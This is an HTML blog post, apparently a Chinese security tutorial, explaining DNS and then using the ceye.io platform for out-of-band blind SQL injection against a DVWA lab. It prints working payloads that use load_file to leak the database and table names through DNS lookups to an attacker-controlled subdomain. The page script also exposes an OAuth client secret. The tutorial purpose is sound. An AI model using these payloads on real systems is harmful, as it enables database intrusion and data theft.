@@ -1,0 +1,512 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+  <meta name="description" content="si1ent">
+  <meta name="keyword" content="hexo-theme, vuejs">
+  
+    <link rel="shortcut icon" href="/css/images/logo.png">
+  
+  <title>
+    
+      DNS Log Injection | si1ent
+    
+  </title>
+  <link href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/tomorrow.min.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/css/plugins/gitment.css">
+
+  
+  <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/geopattern/1.2.3/js/geopattern.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.js"></script>
+  
+    
+<script src="/js/qrious.js"></script>
+
+  
+  
+    
+<script src="/js/gitment.js"></script>
+
+  
+  
+  
+    <!-- MathJax support START -->
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <!-- MathJax support END -->
+  
+
+
+  
+<meta name="generator" content="Hexo 5.2.0"></head>
+<div class="wechat-share">
+  <img src="/css/images/logo.png" />
+</div>
+
+  <body>
+    <header class="header fixed-header">
+  <div class="header-container">
+    <a class="home-link" href="/">
+      <div class="logo"></div>
+      <span>si1ent</span>
+    </a>
+    <ul class="right-list">
+      
+        <li class="list-item">
+          
+            <a href="/" class="item-link">Home</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/tags/" class="item-link">Tags</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/archives/" class="item-link">Archives</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/about/" class="item-link">About</a>
+          
+        </li>
+      
+    </ul>
+    <div class="menu">
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+    </div>
+    <div class="menu-mask">
+      <ul class="menu-list">
+        
+          <li class="menu-item">
+            
+              <a href="/" class="menu-link">Home</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/tags/" class="menu-link">Tags</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/archives/" class="menu-link">Archives</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/about/" class="menu-link">About</a>
+            
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</header>
+
+    <div id="article-banner">
+  <h2>DNS Log Injection</h2>
+  <p class="post-date">2020-06-18</p>
+  <div class="arrow-down">
+    <a href="javascript:;"></a>
+  </div>
+</div>
+<main class="app-body flex-box">
+  <!-- Article START -->
+  <article class="post-article">
+    <section class="markdown-content"><p>注入类漏洞我们都了解,比如之前整理SQL Injection时介绍和说明的一样,而今天学习的DNS Log 注入通过名称我们应该也知道,是利用DNS来完成的带外注入的攻击手段,而这些又如何实现的呢?一起慢慢来学习分析.</p>
+<h2 id="DNS定义"><a href="#DNS定义" class="headerlink" title="DNS定义"></a>DNS定义</h2><h3 id="DNS介绍"><a href="#DNS介绍" class="headerlink" title="DNS介绍"></a>DNS介绍</h3><p>DNS(Domain Name System，域名系统),它使用层次结构的命名系统,因特网上作为域名和IP地址相互映射的一个分布式数据库系统,能够使用户更方便的访问互联网,而不用去记住能够被机器直接读取的IP数串.通过主机名,最终得到该主机名对应的IP地址的过程叫做域名解析(或主机名解析).DNS协议运行在UDP协议之上.服务器端工作在UDP协议端口53和TCP协议端口53上.</p>
+<p>下图是一个DNS解析模拟过程,其中IPV4对应的是客户端,主机存在对应IP地址,经过DNS解析后会找到对应我们想要访问的WEB应用服务器,从而获取我们想要的资源,后续将会继续介绍DNS的请求流程.</p>
+<p><img src="/images/DNS_Log/dns.png"></p>
+<h3 id="DNS请求流程"><a href="#DNS请求流程" class="headerlink" title="DNS请求流程"></a>DNS请求流程</h3><p>DNS是应用层协议,事实上它是为其它应用层协议工作的,包括不限于HTTP和SMTP以及FTP,用于将用户提供的主机名解析为IP地址.</p>
+<p>具体过程如下:</p>
+<ol>
+<li>主机向本地域名服务器实行递归查询,如果本地无法查询域名对应的IP地址时,此时本地域名服务器就以DNS客户的身份,向其他根域名服务器继续发出查询请求报文(替主机继续查询),而不是让主机自己进行下一步查询.</li>
+<li>本地域名服务器向根域名服务器实现迭代查询,根域名服务器收到本地域名服务器发来的查询请求后,如果根域名服务器可以直接查询得到对应IP地址直接回复即可,如果此根域名服务器查询不到,那么它会告知本地域名服务器让它下一步请求哪一个根域名服务器.本地域名服务器获得下一步“指示”后去请求另一根域名服务器,直到获取请求中的域名对应IP地址,本地域名服务器获得IP后会告知开始请求的主机它请求域名对应IP地址,整个DNS查询基本完成.</li>
+<li>主机获得本地域名服务器回复的IP地址,就可以向该IP地址进行HTTP服务器发起TCP连接.</li>
+</ol>
+<h3 id="DNS体系结构"><a href="#DNS体系结构" class="headerlink" title="DNS体系结构"></a>DNS体系结构</h3><p>从用户主机上调用应用程序的角度看,DNS是一个提供简单、直接的转换服务的黑盒子.但事实上.实现这个服务的黑盒子非常复杂,它由分布于全球的大量DNS服务器以及定义了DNS服务器与查询主机通信方式的应用层协议组成.</p>
+<p>DNS的一种简单的设计模式就是在因特网上只使用一个DNS服务器,该服务器包含所有的映射,在这种集中式的设计中,客户机直接将所有查询请求发往单一的DNS服务器,同时该DNS服务器直接对所有查询客户机做出响应,尽管这种设计方式非常诱人.</p>
+<p>但他不适用当前的互联网,因为当今的因特网有着数量巨大并且在持续增长的主机,这种集中式设计会有单点故障,通信容量(上亿台主机发送的查询DNS报文请求,包括但不限于所有的HTTP请求,电子邮件报文服务器,TCP长连接服务),远距离的时间延迟,维护开销大(因为所有的主机名-ip映射都要在一个服务站点更新)等问题.</p>
+<p>DNS服务器一般分三种,根DNS服务器,顶级DNS服务器,权威DNS服务器.使用分布式的层次数据库模式以及缓存方法来解决单点集中式的问题.</p>
+<p>DNS 域名称:</p>
+<table>
+<thead>
+<tr>
+<th align="center">DNS域名</th>
+<th align="center">组织类型</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">gov</td>
+<td align="center">非军事政府机构(政府)</td>
+</tr>
+<tr>
+<td align="center">mil</td>
+<td align="center">军事政府机构</td>
+</tr>
+<tr>
+<td align="center">edu</td>
+<td align="center">教育机构</td>
+</tr>
+<tr>
+<td align="center">com</td>
+<td align="center">商业公司</td>
+</tr>
+<tr>
+<td align="center">net</td>
+<td align="center">网络公司</td>
+</tr>
+<tr>
+<td align="center">…</td>
+<td align="center">…</td>
+</tr>
+</tbody></table>
+<p>客户机上用nslookup命令查询一下 <code>www.test3.com</code>,马上可以看到本地DNS服务器(192.168.88.10)直接查全球13台根域中的某几台,然后一步步解析,通过迭代的方式,直到找到 <code>www.test3.com</code>对应的IP为68.178.213.61.本地DNS服务器得到test3域的IP后,它把这个IP返回给192.168.88.126客户机,完成解析.</p>
+<p><img src="/images/DNS_Log/Wireshark.png"></p>
+<center>Wireshark检测截图</center>
+
+<h3 id="DNS的重要性"><a href="#DNS的重要性" class="headerlink" title="DNS的重要性"></a>DNS的重要性</h3><p>这13台根服务器可以指挥浏览器(比如.internet explorer)和电子邮件程序(比如.Firefox)以控制互联网通信.由于根服务器中有经美国政府批准的260个左右的互联网后缀(如．com、．net等)和一些国家的指定符.</p>
+<p>曾经一位互联网资深专家解释说,美国控制了域名解析的根服务器,也就控制了相应的所有域名,如果美国不想让人访问某些域名,就可以屏蔽掉这些域名,使它们的IP地址无法解析出来,那么这些域名所指向的网站就相当于从互联网的世界中消失了.比如:2004年4月,由于“.ly”域名瘫痪,导致利比亚从互联网上消失了3天.</p>
+<h3 id="DNS攻击中应用"><a href="#DNS攻击中应用" class="headerlink" title="DNS攻击中应用"></a>DNS攻击中应用</h3><p>以上已经了解了DNS整个流程,但是DNS如何利用到攻击中呢?而上面也已经介绍了DNS整个过程并不存在可利用的攻击,除非运营商进行DNS劫持去发发广告之类的事情.</p>
+<p>但我们知道在SQL注入中有一种姿势是延迟注入(时间延迟)来判断注入以及其他敏感数据信息.但,我们知道延迟注入非常费时不容易被发现,所以现在有种方式可以解决此类无法直接显示报错/查询结果的一种攻击方式,DNS Log注入可以满足这一姿势.</p>
+<h2 id="ceye-io介绍"><a href="#ceye-io介绍" class="headerlink" title="ceye.io介绍"></a>ceye.io介绍</h2><p>在进行介绍DNS Log注入之前我们又不得不介绍下一个带外工具,那就是大家熟知的一个平台:ceye.</p>
+<h3 id="ceye-io作用"><a href="#ceye-io作用" class="headerlink" title="ceye.io作用"></a>ceye.io作用</h3><p>CEYE是一个用来检测带外(Out-of-Band)流量的监控平台,如DNS查询和HTTP请求.它可以帮助安全研究人员在测试漏洞时收集信息(例如SSRF/XXE/RFI/RCE等),具体的介绍可以参考ceye的官网介绍.</p>
+<h3 id="产生背景"><a href="#产生背景" class="headerlink" title="产生背景"></a>产生背景</h3><p>漏洞检测或漏洞利用需要进一步完成用户或系统交互,一些漏洞类型没有直接表明(回显)攻击是否成功;如Payload触发了却不在前端页面显示.为了解决这个问题,于是就开发了CEYE平台.通过使用诸如DNS和HTTP之类的带外信道,便可以得到回显信息.</p>
+<h3 id="如何使用"><a href="#如何使用" class="headerlink" title="如何使用"></a>如何使用</h3><p>登录ceye.io,在用户详情页可以看到自己的域名标识符 identifier,对于每个用户,都有唯一的域名标识符如:abcdef.ceye.io,所有来自于abcdef.ceye.io或*.abcdef.ceye.io的DNS查询和HTTP请求都会被记录.通过查看这些记录信息,安全研究人员可以确认并改进自己的漏洞研究方案(其他使用参考官网使用手册).</p>
+<p>注册后会分配identifier</p>
+<p><img src="/images/DNS_Log/ceye.png"></p>
+<h4 id="DNS带外信道检测-Blind-Payload-流程"><a href="#DNS带外信道检测-Blind-Payload-流程" class="headerlink" title="DNS带外信道检测 Blind Payload 流程"></a>DNS带外信道检测 Blind Payload 流程</h4><p><img src="/images/DNS_Log/dns_out.png"></p>
+<center>DNS Log带外注入一般流程</center>
+
+<h4 id="本地测试"><a href="#本地测试" class="headerlink" title="本地测试"></a>本地测试</h4><p>通过上面我们已经注册了ceye并生成了一个三级域名.</p>
+<p>1、首先到profile中添加需要解析的DNS服务器地址,可以添加多个</p>
+<p><img src="/images/DNS_Log/ceye1.png"></p>
+<p>2、在终端中输入</p>
+<p>nslookup test.u7tu9q.ceye.io</p>
+<p><img src="/images/DNS_Log/ns.png"></p>
+<p>3、回到终端中可以获取DNS查询数据</p>
+<p><img src="/images/DNS_Log/ceye2.png"></p>
+<h4 id="HTTP带外信道检测"><a href="#HTTP带外信道检测" class="headerlink" title="HTTP带外信道检测"></a>HTTP带外信道检测</h4><p>可以通过终端或浏览器方式进行HTTP请求目标主机,并携带DNS的三级域名获取返回数据包信息.</p>
+<p><img src="/images/DNS_Log/curl.png"></p>
+<p><img src="/images/DNS_Log/ceye3.png"></p>
+<h2 id="DNS-Log-Injection实战"><a href="#DNS-Log-Injection实战" class="headerlink" title="DNS Log Injection实战"></a>DNS Log Injection实战</h2><h3 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h3><ol>
+<li>MAMP集成环境</li>
+<li>DVWA源码</li>
+<li>CEYE.io平台</li>
+<li>火狐/Chrome及Hackbar插件</li>
+<li>Burp Suite1.7.30</li>
+</ol>
+<h3 id="Start"><a href="#Start" class="headerlink" title="Start"></a>Start</h3><p>0x1:环境搭建部分省略</p>
+<p>环境搭建部分可以直接参考网上即可,这里不做介绍.</p>
+<p>0x2:URL访问</p>
+<p>键入id=1时会输出id存在数据库中.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1&amp;Submit&#x3D;%C3%A6%C2%8F%C2%90%C3%A4%C2%BA%C2%A4#</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/DNS_Log/dvwa.png"></p>
+<p>0x3:单引号测试</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1%27&amp;Submit&#x3D;%C3%83%C2%A6%C3%82%C2%8F%C3%82%C2%90% C3%83%C2%A4%C3%82%C2%BA%C3%82%C2%A4#</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/DNS_Log/dvwa1.png"></p>
+<p>0x4:无报错信息</p>
+<p>可能无法判断是否存在注入(实际中不会有类似黑色部分提醒),后续判断是否存在注入，通过sleep判断服务器是否存在访问延迟,如果存在,说明存在盲注(这里可以参考之前发的SQL Inject Cheat sheet).</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1%27%20and%20sleep(10)--+&amp;Submit&#x3D;%C3%83%C2%A6%C3%82%C2%8F%C3%82%C2%90 %C3%83%C2%A4%C3%82%C2%BA%C3%82%C2%A4#</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/DNS_Log/dvwa2.png"></p>
+<p>0x5:其他手工检测</p>
+<p>在介绍SQL的时候我们知道可以通过ascii、substr等函数进行一个一个字符进行判断,但,我们知道那样效率太低.</p>
+<p>如:判断数据库中第一张表的第一个字符的ascii码:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">&#x27;dvwa&#x27;</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">103</span><span class="comment">--+&amp;Submit=Ã¦ÂÂÃ¤ÂºÂ¤#</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/DNS_Log/dvwa3.png"></p>
+<p>0x6:DNS Log检测</p>
+<p>登录平台,清理DNS Query查询</p>
+<p><img src="/images/DNS_Log/ceye4.png"></p>
+<p>0x7:构造payload</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and if((<span class="keyword">select</span> <span class="keyword">load_file</span>(<span class="keyword">concat</span>(<span class="string">&#x27;\\\\&#x27;</span>,(<span class="keyword">select</span> <span class="keyword">database</span>()),<span class="string">&#x27;.u7tu9q.ceye.io\\abc&#x27;</span>))),<span class="number">1</span>,<span class="number">1</span>)<span class="comment">--+ URL:id=1&#x27; and if((select load_file(concat(&#x27;\\\\&#x27;,(select database()),&#x27;.u7tu9q.ceye.io\\abc&#x27;))),1,1)--+ &amp;Submit=Ã¦ÂÂÃ¤ÂºÂ¤#</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/DNS_Log/dvwa4.png"></p>
+<p>0x8:查询结果</p>
+<p>如下图得知:</p>
+<p><img src="/images/DNS_Log/ceye5.png"></p>
+<p>0x9:其他payload</p>
+<p>获取信息可以通过修改常规注入时payload一致.</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and if((<span class="keyword">select</span> <span class="keyword">load_file</span>(<span class="keyword">concat</span>(<span class="string">&#x27;\\\\&#x27;</span>,(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">&quot;dvwa&quot;</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="string">&#x27;.u7tu9q.ceye.io\\abc&#x27;</span>))),<span class="number">1</span>,<span class="number">1</span>)<span class="comment">--+ &amp;Submit=Ã¦ÂÂÃ¤ÂºÂ¤#</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/DNS_Log/dvwa5.png"></p>
+<p><img src="/images/DNS_Log/ceye6.png"></p>
+<p>0x10:其他</p>
+<p>其他payload不一一测试,可自行测试.</p>
+<h3 id="英文参考"><a href="#英文参考" class="headerlink" title="英文参考"></a>英文参考</h3><p>英文版的相关介绍可参考以下pdf文件,自行下载查阅.</p>
+<p><a target="_blank" rel="noopener" href="http://www.si1ent.xyz/ziliao/DNSLogSQLInjection.pdf">DNS_Log_Injection</a></p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.seceye.cn&#x2F;710.html</span><br><span class="line">http:&#x2F;&#x2F;byd.dropsec.xyz&#x2F;2016&#x2F;12&#x2F;04&#x2F;dnslog%E5%88%A9%E7%94%A8&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;bbs.ichunqiu.com&#x2F;thread-22002-1-1.html</span><br><span class="line">https:&#x2F;&#x2F;ricterz.me&#x2F;posts&#x2F;%E7%AC%94%E8%AE%B0:%20D ata%20Retrieval%20over%20DNS%20in%20SQL%20Injection%20Attacks</span><br></pre></td></tr></table></figure>
+
+</section>
+    <!-- Tags START -->
+    
+      <div class="tags">
+        <span>Tags:</span>
+        
+  <a href="/tags#DNS-Injection" >
+    <span class="tag-code">DNS-Injection</span>
+  </a>
+
+      </div>
+    
+    <!-- Tags END -->
+    <!-- NAV START -->
+    
+  <div class="nav-container">
+    <!-- reverse left and right to put prev and next in a more logic postition -->
+    
+      <a class="nav-left" href="/2020/06/09/API%E5%8F%8A%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-1/">
+        <span class="nav-arrow">← </span>
+        
+          API及客户端漏洞挖掘
+        
+      </a>
+    
+    
+      <a class="nav-right" href="/2020/06/20/Drozer%E6%A3%80%E6%B5%8B%E5%AD%A6%E4%B9%A0/">
+        
+          Drozer检测学习
+        
+        <span class="nav-arrow"> →</span>
+      </a>
+    
+  </div>
+
+    <!-- NAV END -->
+    <!-- 打赏 START -->
+    
+      <div class="money-like">
+        <div class="reward-btn">
+          赏
+          <span class="money-code">
+            <span class="alipay-code">
+              <div class="code-image"></div>
+              <b>使用支付宝打赏</b>
+            </span>
+            <span class="wechat-code">
+              <div class="code-image"></div>
+              <b>使用微信打赏</b>
+            </span>
+          </span>
+        </div>
+        <p class="notice">若你觉得我的文章对你有帮助，欢迎点击上方按钮对我打赏</p>
+      </div>
+    
+    <!-- 打赏 END -->
+    <!-- 二维码 START -->
+    
+      <div class="qrcode">
+        <canvas id="share-qrcode"></canvas>
+        <p class="notice">扫描二维码，分享此文章</p>
+      </div>
+    
+    <!-- 二维码 END -->
+    
+      <!-- Gitment START -->
+      <div id="comments"></div>
+      <!-- Gitment END -->
+    
+  </article>
+  <!-- Article END -->
+  <!-- Catalog START -->
+  
+    <aside class="catalog-container">
+  <div class="toc-main">
+    <strong class="toc-title">Catalog</strong>
+    
+      <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#DNS%E5%AE%9A%E4%B9%89"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">DNS定义</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#DNS%E4%BB%8B%E7%BB%8D"><span class="toc-nav-number">1.1.</span> <span class="toc-nav-text">DNS介绍</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#DNS%E8%AF%B7%E6%B1%82%E6%B5%81%E7%A8%8B"><span class="toc-nav-number">1.2.</span> <span class="toc-nav-text">DNS请求流程</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#DNS%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84"><span class="toc-nav-number">1.3.</span> <span class="toc-nav-text">DNS体系结构</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#DNS%E7%9A%84%E9%87%8D%E8%A6%81%E6%80%A7"><span class="toc-nav-number">1.4.</span> <span class="toc-nav-text">DNS的重要性</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#DNS%E6%94%BB%E5%87%BB%E4%B8%AD%E5%BA%94%E7%94%A8"><span class="toc-nav-number">1.5.</span> <span class="toc-nav-text">DNS攻击中应用</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#ceye-io%E4%BB%8B%E7%BB%8D"><span class="toc-nav-number">2.</span> <span class="toc-nav-text">ceye.io介绍</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#ceye-io%E4%BD%9C%E7%94%A8"><span class="toc-nav-number">2.1.</span> <span class="toc-nav-text">ceye.io作用</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E4%BA%A7%E7%94%9F%E8%83%8C%E6%99%AF"><span class="toc-nav-number">2.2.</span> <span class="toc-nav-text">产生背景</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8"><span class="toc-nav-number">2.3.</span> <span class="toc-nav-text">如何使用</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#DNS%E5%B8%A6%E5%A4%96%E4%BF%A1%E9%81%93%E6%A3%80%E6%B5%8B-Blind-Payload-%E6%B5%81%E7%A8%8B"><span class="toc-nav-number">2.3.1.</span> <span class="toc-nav-text">DNS带外信道检测 Blind Payload 流程</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E6%9C%AC%E5%9C%B0%E6%B5%8B%E8%AF%95"><span class="toc-nav-number">2.3.2.</span> <span class="toc-nav-text">本地测试</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#HTTP%E5%B8%A6%E5%A4%96%E4%BF%A1%E9%81%93%E6%A3%80%E6%B5%8B"><span class="toc-nav-number">2.3.3.</span> <span class="toc-nav-text">HTTP带外信道检测</span></a></li></ol></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#DNS-Log-Injection%E5%AE%9E%E6%88%98"><span class="toc-nav-number">3.</span> <span class="toc-nav-text">DNS Log Injection实战</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E5%87%86%E5%A4%87"><span class="toc-nav-number">3.1.</span> <span class="toc-nav-text">准备</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#Start"><span class="toc-nav-number">3.2.</span> <span class="toc-nav-text">Start</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E8%8B%B1%E6%96%87%E5%8F%82%E8%80%83"><span class="toc-nav-number">3.3.</span> <span class="toc-nav-text">英文参考</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E5%8F%82%E8%80%83"><span class="toc-nav-number">4.</span> <span class="toc-nav-text">参考</span></a></li></ol>
+    
+  </div>
+</aside>
+
+  
+  <!-- Catalog END -->
+</main>
+
+<script>
+  (function () {
+    var url = 'http://example.com/2020/06/18/DNS-Log-Injection/';
+    var banner = ''
+    if (banner !== '' && banner !== 'undefined' && banner !== 'null') {
+      $('#article-banner').css({
+        'background-image': 'url(' + banner + ')'
+      })
+    } else {
+      $('#article-banner').geopattern(url)
+    }
+    $('.header').removeClass('fixed-header')
+
+    // error image
+    $(".markdown-content img").on('error', function() {
+      $(this).attr('src', 'http://file.muyutech.com/error-img.png')
+      $(this).css({
+        'cursor': 'default'
+      })
+    })
+
+    // zoom image
+    $(".markdown-content img").on('click', function() {
+      var src = $(this).attr('src')
+      if (src !== 'http://file.muyutech.com/error-img.png') {
+        var imageW = $(this).width()
+        var imageH = $(this).height()
+
+        var zoom = ($(window).width() * 0.95 / imageW).toFixed(2)
+        zoom = zoom < 1 ? 1 : zoom
+        zoom = zoom > 2 ? 2 : zoom
+        var transY = (($(window).height() - imageH) / 2).toFixed(2)
+
+        $('body').append('<div class="image-view-wrap"><div class="image-view-inner"><img src="'+ src +'" /></div></div>')
+        $('.image-view-wrap').addClass('wrap-active')
+        $('.image-view-wrap img').css({
+          'width': `${imageW}`,
+          'transform': `translate3d(0, ${transY}px, 0) scale3d(${zoom}, ${zoom}, 1)`
+        })
+        $('html').css('overflow', 'hidden')
+
+        $('.image-view-wrap').on('click', function() {
+          $(this).remove()
+          $('html').attr('style', '')
+        })
+      }
+    })
+  })();
+</script>
+
+
+  <script>
+    var qr = new QRious({
+      element: document.getElementById('share-qrcode'),
+      value: document.location.href
+    });
+  </script>
+
+
+
+  <script>
+    var gitmentConfig = "si1ent";
+    if (gitmentConfig !== 'undefined') {
+      var gitment = new Gitment({
+        id: "DNS Log Injection",
+        owner: "si1ent",
+        repo: "",
+        oauth: {
+          client_id: "0f87e490e00ee3fd87ef",
+          client_secret: "4a9d2b148e7971c2201ad12131ce8bf8159ccd2e"
+        },
+        theme: {
+          render(state, instance) {
+            const container = document.createElement('div')
+            container.lang = "en-US"
+            container.className = 'gitment-container gitment-root-container'
+            container.appendChild(instance.renderHeader(state, instance))
+            container.appendChild(instance.renderEditor(state, instance))
+            container.appendChild(instance.renderComments(state, instance))
+            container.appendChild(instance.renderFooter(state, instance))
+            return container;
+          }
+        }
+      })
+      gitment.render(document.getElementById('comments'))
+    }
+  </script>
+
+
+
+
+    <div class="scroll-top">
+  <span class="arrow-icon"></span>
+</div>
+    <footer class="app-footer">
+  <p class="copyright">
+    &copy; 2020 | Proudly powered by <a href="https://hexo.io" target="_blank">Hexo</a>
+    <br>
+    </p>
+    <p class="copyright">
+    皖ICP备19004273
+  </p>
+</footer>
+
+<script>
+  function async(u, c) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+</script>
+<script>
+  async("//cdnjs.cloudflare.com/ajax/libs/fastclick/1.0.6/fastclick.min.js", function(){
+    FastClick.attach(document.body);
+  })
+</script>
+
+<script>
+  var hasLine = 'true';
+  async("//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js", function(){
+    $('figure pre').each(function(i, block) {
+      var figure = $(this).parents('figure');
+      if (hasLine === 'false') {
+        figure.find('.gutter').hide();
+      }
+      var lang = figure.attr('class').split(' ')[1] || 'code';
+      var codeHtml = $(this).html();
+      var codeTag = document.createElement('code');
+      codeTag.className = lang;
+      codeTag.innerHTML = codeHtml;
+      $(this).attr('class', '').empty().html(codeTag);
+      figure.attr('data-lang', lang.toUpperCase());
+      hljs.highlightBlock(block);
+    });
+  })
+</script>
+<!-- Baidu Tongji -->
+
+
+<script src="/js/script.js"></script>
+
+
+  </body>
+</html>
